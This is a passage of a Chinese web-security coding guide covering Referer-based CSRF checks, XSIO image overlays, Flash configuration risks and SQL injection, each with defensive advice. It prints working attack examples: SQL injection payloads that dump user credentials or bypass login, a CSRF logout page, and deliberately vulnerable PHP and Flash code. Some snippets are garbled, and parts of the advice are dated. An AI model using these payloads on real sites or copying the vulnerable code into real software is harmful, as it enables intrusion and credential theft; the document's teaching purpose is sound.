+<h3 id="1-3-4-最佳实践参考代码"><a href="#1-3-4-最佳实践参考代码" class="headerlink" title="1.3.4. 最佳实践参考代码"></a>1.3.4. 最佳实践参考代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected boolean invalidRefer() &#123;</span><br><span class="line">    String referer = request.getHeader(&quot;Referer&quot;);</span><br><span class="line">    if (StringUtils.isEmpty(referer)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (referer.contains(&quot;?&quot;)) &#123;</span><br><span class="line">            referer = referer.substring(0, referer.indexOf(&quot;?&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        URI referUri = new URI(referer);</span><br><span class="line">        String homeDomain = getText(&quot;login.success.page&quot;); //白名单 String curDomain</span><br><span class="line">        = referUri.getHost();</span><br><span class="line">        if (curDomain.contains(homeDomain.substring(homeDomain.indexOf(&quot;.&quot;) + 1))) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(Exception e) &#123;</span><br><span class="line">        log.error(&quot;--invalid uri--&quot; + referer, e);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>更多信息请参考</p>
+<h2 id="1-4-XSIO-攻击"><a href="#1-4-XSIO-攻击" class="headerlink" title="1.4.    XSIO 攻击"></a>1.4.    XSIO 攻击</h2><h3 id="1-4-1-XSIO-漏洞说明"><a href="#1-4-1-XSIO-漏洞说明" class="headerlink" title="1.4.1.    XSIO 漏洞说明"></a>1.4.1.    XSIO 漏洞说明</h3><p>XSIO 产生的原因是因为没有限制图片的 position 属性为 absolute 绝对定位图片的位 置，这就导致了可以把张图插入到整个页面的任意位置，包括网站的 banner，包括一个 link、一个 button，覆盖页面的连接，甚至覆盖整体页面，很显然这样的漏洞对安全造成了 极大的风险，例如网络钓鱼，非法广告，点击挟持等被诸多攻击方法。</p>
+<h3 id="1-4-2-XSIO-漏洞实例"><a href="#1-4-2-XSIO-漏洞实例" class="headerlink" title="1.4.2.    XSIO 漏洞实例"></a>1.4.2.    XSIO 漏洞实例</h3><p>当百度博客用户编辑文章时，加入如下代码，即可造成覆盖任意地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;a   href=&quot;http://www.ph4nt0m.org&quot;&gt;</span><br><span class="line">&lt;img src=&quot;http://img.baidu.com/hi/img/portraitn.jpg&quot; style=&quot;position:absolute;left:123px;top:123px;&quot;&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="1-4-3-XSIO-漏洞解决"><a href="#1-4-3-XSIO-漏洞解决" class="headerlink" title="1.4.3.    XSIO 漏洞解决"></a>1.4.3.    XSIO 漏洞解决</h3><ol>
+<li>如果对效果要求不高，建议过滤图片标签中 position 属性 absolute </li>
+<li>如果对效果要求较高，不允许 position 属性设置为 absolute 参考最佳实践代码<h2 id="1-5-Cross-site-request-forgery（跨站请求伪造）"><a href="#1-5-Cross-site-request-forgery（跨站请求伪造）" class="headerlink" title="1.5.    Cross-site request forgery（跨站请求伪造）"></a>1.5.    Cross-site request forgery（跨站请求伪造）</h2><h3 id="1-5-1-CSRF-介绍"><a href="#1-5-1-CSRF-介绍" class="headerlink" title="1.5.1.    CSRF 介绍"></a>1.5.1.    CSRF 介绍</h3>CSRF 的全称是 Cross-site request forgery，即跨站请求伪造，我们可以简单的理解这 种漏洞为，攻击者利用被攻击者的身份发起了某些被攻击者原本不知情的网络请求。包括以 被攻击者的身 份发布一条微博，以被攻击者的身份发布一条留言，以被攻击者的身份关注某 个用户的微博等。著名的微博蠕虫就是利用这种漏洞，造成了较大的影响<h3 id="1-5-2-CSRF-实例"><a href="#1-5-2-CSRF-实例" class="headerlink" title="1.5.2.    CSRF 实例"></a>1.5.2.    CSRF 实例</h3></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">····</span><br><span class="line">此处有图片！！！！粘贴到CF再加入</span><br><span class="line">·····</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+<p>首先构造如下 HTML 页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src= http://id.example.com/uc/login?ltype=logout&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>页面连接设为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.hacker.com/xxx.html</span><br></pre></td></tr></table></figure></p>
+<p>并把页面连接加入到商品评论，诱使访问者点击</p>
+<p>当用户访问京东网站，发现连接点击后，自动退出网站账号。</p>
+<h3 id="1-5-3-解决方案"><a href="#1-5-3-解决方案" class="headerlink" title="1.5.3. 解决方案"></a>1.5.3. 解决方案</h3><p>方法一（长久有效，彻底防御）</p>
+<pre><code>在与用户交互时，设置一个 CSRF 的随机 TOKEN，种植在用户的 cookie 中。
+当用户 提交表单时，生成隐藏域
+值为 COOKIE 中随机 TOKEN，用户提交表单后验证两处 token值，来判断是否为用户提交
+</code></pre><p>方法二（临时防御，可以绕过）</p>
+<pre><code>验证用户提交数据的 refere 信息，当为提交页时，说明为用户提交，当为其他页面 时，说明为 csrf 攻击。
+</code></pre><p>验证 refere 代码参考</p>
+<p>此方法只应用于单一交互表单，只验证表单数据可用以下方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">String referer = request.getHeader(&quot;referer&quot;);</span><br><span class="line">if (StringUtils.isEmpty(referer)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">if (validAddress(referer)) &#123;</span><br><span class="line">    popInfoService.savePopInf(popInfVo);</span><br><span class="line">&#125;</span><br><span class="line">private boolean validAddress(String referer) &#123;</span><br><span class="line">    String refAddress = &quot;http://xxxx.vipkid.com&quot;;</span><br><span class="line">    String str = referer.substring(0, refAddress.length());</span><br><span class="line">    if (refAddress.equals(str)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;此方法适合放置全站，以防止csrf攻击，但会对性能有所影响，不建议使用protected boolean invalidRefer() &#123;</span><br><span class="line">    String referer = request.getHeader(&quot;Referer&quot;);</span><br><span class="line">    if (StringUtils.isEmpty(referer)) &#123;</span><br><span class="line">        return true;｝</span><br><span class="line">        try &#123;</span><br><span class="line">            if (referer.contains(&quot;?&quot;)) &#123;</span><br><span class="line">                referer = referer.substring(0, referer.indexOf(&quot;?&quot;));</span><br><span class="line">            &#125;</span><br><span class="line">            URI referUri = new URI(referer);</span><br><span class="line">            String domain = referUri.getHost();</span><br><span class="line">            if (StringUtils.isNotBlank(domain) &amp; amp; &amp; amp; (domain.endsWith(&quot;vipkid.com.cn&quot;)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; catch(Exception e) &#123;</span><br><span class="line">            log.error(&quot;--invalid uri--&quot; + referer, e);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="1-6-FLASH-安全"><a href="#1-6-FLASH-安全" class="headerlink" title="1.6.    FLASH 安全"></a>1.6.    FLASH 安全</h2><p>利用 flash 服务端和客户端在安全配置和文件编码上的问题，导致攻击者可以利用客户 端的 flash 文件发起各种请求或者攻击客户端的页面。<br>FLASH 的安全问题主要有服务端的安全设计问题和客户端的 flash 安全两块</p>
+<h3 id="1-6-1-FLASH-客户端安全"><a href="#1-6-1-FLASH-客户端安全" class="headerlink" title="1.6.1.    FLASH 客户端安全"></a>1.6.1.    FLASH 客户端安全</h3><h4 id="1-6-1-1-本地配置文件错误"><a href="#1-6-1-1-本地配置文件错误" class="headerlink" title="1.6.1.1. 本地配置文件错误"></a>1.6.1.1. 本地配置文件错误</h4><p>客户端在嵌入 flash 文件的时候没有指定 flash 文件的客户端限制策略，导致嵌入在客 户端的 flash 文件可以访问 HTML 页面的 DOM 数或者发起跨域请求。<br>错误的配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0`name=&quot;Main&quot; width=&quot;1000&quot; height=&quot;600&quot; align=&quot;middle&quot; id=&quot;Main&quot;&gt;</span><br><span class="line">&lt;embed flashvars=&quot;site=&amp;sitename=&quot; src=”http://a.com/xxx.swf” name=&quot;Main&quot; allowscriptaccess=&quot;always&quot;	type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;</span><br><span class="line">&lt;/object&gt;</span><br></pre></td></tr></table></figure></p>
+<p>例子中的 allowscriptaccess 选项为 always，这样的配置会使 flash 对于 html 的通讯也就是执行 javascript不做任何限制，默认情况下值为“SameDomain”，既只允许来自于本 域的 flash 与 html 通讯，建议设置为 never；例子中没有设置 allowNetworking 选项，需 要把 allowNetworking 设置为 none，因为 allowNetworking 在设置为 all（默认是）或 者是 internal 的情况下会存在发生 csrf 的风险，因为 flash 发起网络请求继承的是浏览器的 会话，而且会带上 session cookie 和本地 cookie。</p>
+<h4 id="1-6-1-2-客户端安全配置规范"><a href="#1-6-1-2-客户端安全配置规范" class="headerlink" title="1.6.1.2. 客户端安全配置规范"></a>1.6.1.2. 客户端安全配置规范</h4><ol>
+<li>禁止设置 flash 的 allowscriptaccess 为 always，必须设置为 never，如果设 置为 SameDomain，需要客户可以上传的 flash 文件要在单独的一个域下。</li>
+<li><p>设置 allowNetworking 选项为 none。</p>
+</li>
+<li><p>设置 allowfullscreen 选项为 false。</p>
+</li>
+</ol>
+<h3 id="1-6-2-FLASH-服务端安全"><a href="#1-6-2-FLASH-服务端安全" class="headerlink" title="1.6.2.    FLASH 服务端安全"></a>1.6.2.    FLASH 服务端安全</h3><h4 id="1-6-2-1-服务端配置错误-跨域访问"><a href="#1-6-2-1-服务端配置错误-跨域访问" class="headerlink" title="1.6.2.1. 服务端配置错误-跨域访问"></a>1.6.2.1. 服务端配置错误-跨域访问</h4><p>FLASH 配置文件 crossdomain.xml 介绍 flash 在跨域时唯一的限制策略就是 crossdomain.xml 文件，该文件限制了 flash 是否可以跨域读写数据以及允许从什么地方 跨域读写数据。错误配置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">&lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样的配置可以导致允许任何来自网络上的请求、不论该请求是来自本域内还是其它<br>域发起的。正确的配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">    &lt;allow-access-from domain=&quot;*.meipai.com&quot;/&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="1-6-2-2-FLASH-开发规范"><a href="#1-6-2-2-FLASH-开发规范" class="headerlink" title="1.6.2.2. FLASH 开发规范"></a>1.6.2.2. FLASH 开发规范</h4><ol>
+<li><p>移除敏感信息确认没有包含像用户名、密码、SQL 查询或者其他认证信息在 swf 文件里 面，因为 swf 文件能够被简单的反编译而使信息泄露</p>
+</li>
+<li><p>客户端的验证客户端的验证能够通过反编译软件轻易的去除后重新编译，必须在客户端 和服务端都做一次验证，但是服务端的验证不能少</p>
+</li>
+<li><p>去除调试信息去除类似于”trace”和其他一些调试语句，因为他们能够暴露代码或数据的 功能，如下代码片段暴露了该段代码的验证功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If(checklogin)</span><br><span class="line">    &#123;</span><br><span class="line">        Userlogin = ture;</span><br><span class="line">    &#125;</span><br><span class="line">trace(“管理员验证成功”);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>参数传入如果有加载外部数据的需求，尽量不要在 html 中用“params”标签或者是 querystring 这种形式来注入数据到 swf 文件中。可以的办法是通过 sever 端的一个 http 请求来得到参数。</li>
+<li><p>allowDomain()<br>flash 文件如果有和其他 swf 文件通信的需求，需要在 swf 中配置 allowDomain()为 制定的来源，禁止用*符号来允许任意来源如下 AS 代码被严格禁止：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.security.allowDomain(&quot;*&quot;);</span><br><span class="line">loadMovie(param1,param2);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ActionScript2.0 未初始化全局变量<br>AS2.0 中接受用户通过 FlashVars 和 Querystring 中传入的数据并放到全局变量空间 中，如果利用不当会引发变量未初始化漏洞从而绕过部分认证，如下 AS 代码片段所示：<br>如果用户在 GET 请求或者在 HTML 中作为一个对象参数将 userLoggedIn 设为 true， 如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx.com/cn_ben/login.swf?Userlogin=ture</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>解决方案：AS2.0 使用_resolve 属性捕获未定义的变量或函数，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// instantiate a new object </span><br><span class="line">var myObject: Object = new Object();</span><br><span class="line"></span><br><span class="line">// define the    resolve </span><br><span class="line">function myObject.resolve = function(name) &#123;</span><br><span class="line">    return &quot;未定义的变量&quot;;</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>加载调用外部文件当 FLASH 加载调用外部文件的时候需要过<br>滤掉里面的恶意内容，<br>主要有 metadata 里面的数据和 flash mp3 player 里的 Mp3 ID3 Data，可以引发 XSS 漏洞（使攻击者可以执行任意 javascript），如下代码片段所示：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">this.createTextField(&quot;txtMetadata&quot;, this.getNextHighestDepth(), 10, 10, 500, 500);</span><br><span class="line">txtMetadata.html = true;</span><br><span class="line">var nc: NetConnection = new NetConnection();</span><br><span class="line">nc.connect(null);</span><br><span class="line">var ns: NetStream = new NetStream(nc);</span><br><span class="line">ns.onMetaData = function(infoObject: Object) &#123;</span><br><span class="line">    for (var propName: String in infoObject) &#123;</span><br><span class="line">        txtMetadata.htmlText += propName + &quot; = &quot; + infoObject[propName];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">ns.play(&quot;http://localhost/test.flv&quot;);</span><br></pre></td></tr></table></figure>
+<p>如果 test.flv 中包含了 js 代码将被执行；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onID3 = function() &#123; my_text.htmlText= this.id3.author;&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>8、禁止直接调用 ExternalInterface.call 来接受外部参数 ExternalInterface.call 可以直接调用客户端的 js 脚本，如下 as 代码片段所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Import flash.external.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">……省略代码……</span><br><span class="line">ExternalInterface.call(用户输入变量，用户数据参数);</span><br><span class="line">……省略代码……</span><br></pre></td></tr></table></figure></p>
+<p>如果用户提交变量 eval，提交参数为任意 js 语句，那么用户提交的代码就会被执行。</p>
+<h1 id="2-服务端安全"><a href="#2-服务端安全" class="headerlink" title="2. 服务端安全"></a>2. 服务端安全</h1><h2 id="2-1-SQL-注入"><a href="#2-1-SQL-注入" class="headerlink" title="2.1. SQL 注入"></a>2.1. SQL 注入</h2><h3 id="2-1-1-SQL-注入说明"><a href="#2-1-1-SQL-注入说明" class="headerlink" title="2.1.1. SQL 注入说明"></a>2.1.1. SQL 注入说明</h3><p>应用为了和数据库进行沟通完成必要的管理和存储工作，必须和数据库保留一种接口。 目前的数据库一般都是提供 api 以支持管理，应用使用底层开发语言如 Php，Java，asp， Python 与这些 api 进行通讯。对于数据库的操作，目前普遍使用一种 SQL 语言（Structured Query Language 语言，SQL 语言的功能包括查询、操纵、定义和控制，是 一个综合的、通用的关系数据库语言，同时又是一种高度非过程化的语言，只要求用户指出 做什么而不需要指出怎么做），SQL 作为字符串通过 API 传入给数据库，数据库将查询的结果返回，数据库自身是无法分辨传入的 SQL 是合法的还是不合法的，它完全信任传入的数据，如果传入的 SQL 语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。</p>
+<h3 id="2-1-2-SQL-注入影响-恶意用户利用-SQL-注入可以做到："><a href="#2-1-2-SQL-注入影响-恶意用户利用-SQL-注入可以做到：" class="headerlink" title="2.1.2. SQL 注入影响 恶意用户利用 SQL 注入可以做到："></a>2.1.2. SQL 注入影响 恶意用户利用 SQL 注入可以做到：</h3><ol>
+<li>可读取数据库中的库和表 </li>
+<li>可执行系统命令</li>
+<li>可以修改任意文件</li>
+<li>可以安装木马后门</li>
+</ol>
+<h3 id="2-1-3-SQL-注入示例"><a href="#2-1-3-SQL-注入示例" class="headerlink" title="2.1.3. SQL 注入示例"></a>2.1.3. SQL 注入示例</h3><p>代码示例</p>
+<p>以下PHP脚本的作用为检索数据库内的图书库存，该脚本存在SQL注入漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  header(&apos;Content-Type:text/html;charset=UTF-8&apos;);</span><br><span class="line">  $author = $_GET(&apos;author&apos;);</span><br><span class="line">  $con = pg_connect(&quot;host=localhost dbname=book user=test password=test&quot;);</span><br><span class="line">  $sqlstm = &quot;SELECT id,title,author,publisher,date,price FROM books WHERE author = &apos;$author&apos; ORDER BY id&quot;;</span><br><span class="line">  $rs = pg_query($con,$sqlstm);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p> 攻击实例</p>
+<p>利用代码示例的代理，进行正常的检索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/book/seach.php?author=xx</span><br></pre></td></tr></table></figure></p>
+<p>接下来让我们看一下针对此脚本的攻击方法。</p>
+<blockquote>
+<ol>
+<li>错误消息导致的信息泄露<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/book/seach.php?author=&apos;+and+cast((select +id||&apos;:&apos;||pwd+from+users+offset+0+limit+1)+as+integer)&gt;1--</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<p>   执行，页面报错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Waring:pg_query()[function_pg_query]Query failed ERROR:invalid input syntax for integer:admin:123456。</span><br></pre></td></tr></table></figure></p>
+<p>错误消息中显示了用户名和密码为admin:123456。这就是利用SQL注入攻击致使信息泄露的手段。该子查询查找user表中的第一条数据的id和pwd字段后，返回将两者以冒号相连。然后尝试将字符串转换为integer类型，但由于转换类型出错，页面显示了错误信息。因此，我们也要注意，不要将程序的内部错误显示在错误信息中。</p>
+<blockquote>
+<ol>
+<li>UNION SELECT导致的信息泄露</li>
+</ol>
+</blockquote>
+<p><strong>UNION SELECT</strong> 的作用为将两个SQL语句的检索结果求和。</p>
+<p>执行以下URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/book/seach.php?author=&apos;+union+select+id,pwd,name,addr,null,null,null+from users--</span><br></pre></td></tr></table></figure></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>书籍id</th>
+<th>书名</th>
+<th>作者名</th>
+<th>出版社</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td>admin</td>
+<td>123456</td>
+<td>jack</td>
+<td>北京市XXXXXX。</td>
+</tr>
+<tr>
+<td></td>
+<td>test</td>
+<td>123456</td>
+<td>john</td>
+<td>北京市XXXXXX。</td>
+</tr>
+<tr>
+<td></td>
+<td>example</td>
+<td>123456</td>
+<td>example</td>
+<td>北京市</td>
+</tr>
+</tbody>
+</table>
+<p>我们可以看到该语句查询出了user表的所有数据，再利用其他语句配合可将整个数据库打包下载，又被称为拖库攻击。</p>
+<ol>
+<li><p>使用SQL注入绕过认证</p>
+<p>当登陆页面存在SQL注入漏洞时，认证处理将被绕过，从而导致在不知道密码的情况下能成功登陆应用。</p>
+<p>以下是一个用户登陆页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">head</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登陆"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">```   </span><br><span class="line"> </span><br><span class="line">   下面是接收用户名和密码后进行登陆处理的脚本。</span><br><span class="line">   </span><br><span class="line">```php</span><br><span class="line">   <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">     session_start();</span></span><br><span class="line"><span class="php">     header(<span class="string">'Content-Type:text/html;charset=UTF-8'</span>);</span></span><br><span class="line"><span class="php">     $id = @$_POST[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">     $pwd = @$_POST[<span class="string">'pwd'</span>];</span></span><br><span class="line"><span class="php">     $con = pg_connect(<span class="string">"host=localhost dbname=book user=test password=test"</span>);</span></span><br><span class="line"><span class="php">     $sql=<span class="string">"SELECT * FROM users WHERE id = '$id' and pwd='$pwd'"</span>;</span></span><br><span class="line"><span class="php">     $rs = pg_query($con,$sql);</span></span><br><span class="line"><span class="php">   <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>正常情况下，登陆页面输入用户名<strong>admin</strong>和密码<strong>123456</strong>才能登陆成功。</p>
+<p>但是假设攻击者在不知道密码的情况下输入’ or ‘a’=’a,这时登陆成功。</p>
+<p>此时，拼接后的SQL语句如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;admin&apos; and pwd = &apos; &apos; OR &apos;a&apos;=&apos;a&apos;</span><br></pre></td></tr></table></figure>
+<p>SQL语句的末尾被添加了<strong>OR ‘a’=’a’</strong>,因此<strong>where</strong>语句始终保持成立状态。如果登陆页面存在SQL注入漏洞，就可能使密码输入框形同虚设。</p>
+</li>
+<li><p>其他攻击</p>
+<p>根据数据库引擎的不同，通过SQL注入还可能会达到以下效果。</p>
+<blockquote>
+<p>  3.1. 执行OS命令</p>
+<p>  3.2. 执行文件</p>
+<p>  3.3、编辑文件</p>
+<p>  3.4、通过HTTP请求攻击其他服务器</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="2-1-4-SQL-注入解决方法"><a href="#2-1-4-SQL-注入解决方法" class="headerlink" title="2.1.4. SQL 注入解决方法"></a>2.1.4. SQL 注入解决方法</h3><p>解决 SQL 注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配<br>置使用最小权限原则。 </p>
+<blockquote>
+<ol>
+<li>所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将 用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注入攻击。 </li>
+<li>对进入数据库的特殊字符（’”\尖括号&amp;*;等）进行转义处理，或编码转换。</li>
+<li>严格限制变量类型，比如整型变量就采用 intval()函数过滤，数据库中的存储字段必须对 应为 int 型。</li>
+<li>数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句无法正确执行。</li>
+<li>网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致 一些过滤模型被绕过。</li>
+<li>严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从 而最大限度的减少注入攻击对数据库的危害。</li>
+<li>避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误 信息进行一些判断。</li>
+<li>在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测，及时修补这些 SQL 注入漏洞。</li>
+<li>确认 PHP 配置文件中的 magicquotesgpc 选项保持开启 </li>
+</ol>
+</blockquote>
+<p>参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx</span><br></pre></td></tr></table></figure></p>
